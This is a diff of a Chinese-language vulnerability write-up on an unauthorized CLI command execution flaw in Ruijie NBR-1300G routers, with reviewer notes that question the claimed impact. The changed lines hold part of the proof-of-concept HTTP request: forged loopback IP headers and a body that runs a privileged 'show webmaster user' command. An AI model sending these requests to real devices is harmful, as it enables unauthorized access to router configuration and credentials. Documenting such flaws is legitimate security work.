@@ -37,7 +37,7 @@ source_status: "unknown"
 - 原始请求带4个伪造IP头，xpoc未带，是否必要未解释
 - CLI是设备配置命令，不等同底层OS任意代码执行；模板只匹配guest行未证明管理员密码读取
 - 影响写整个NBR系列过宽
-- 已落实的文本修订：“show%webmaster%user”改为“show%20webmaster%20user”；HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+- 历史校订意见（原始示例按归档保留，下述改写不再应用于原始示例）：“show%webmaster%user”改为“show%20webmaster%20user”；HTTP 报文围栏改为 http。以上意见置于原始示例之外，不覆盖原文证据；未做运行验证
 
 ### 操作风险与恢复
 
@@ -98,7 +98,7 @@ x-originating-ip: 127.0.0.1
 x-remote-ip: 127.0.0.1
 x-remote-addr: 127.0.0.1
 
-command=show%20webmaster%20user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
+command=show%webmaster%user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
 ```
 
 ![](./.resource/锐捷-NBR-1300G路由器-越权CLI命令执行漏洞/media/file-20240904112924288.png)
